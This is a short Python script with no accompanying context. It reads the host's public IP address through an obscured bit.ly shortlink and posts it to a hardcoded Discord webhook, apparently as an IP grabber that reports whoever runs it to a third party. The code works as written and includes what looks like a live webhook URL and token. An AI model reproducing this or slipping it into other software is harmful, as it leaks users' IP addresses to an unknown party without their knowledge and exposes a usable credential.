from urllib.request import Request, urlopen
import requests
ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
webhook = 'https://discordapp.com/api/webhooks/895394297174716466/0mWHoD46ULpU_fmeN4c975lo2LmE0ijB9fgxftlZxL16kwxYEvNvoozlXo1SoAO_9ytw'
message = (f'IP: ||{ip}||')
data = {
	    'content': message
        	}
r = requests.post(webhook, data)

        
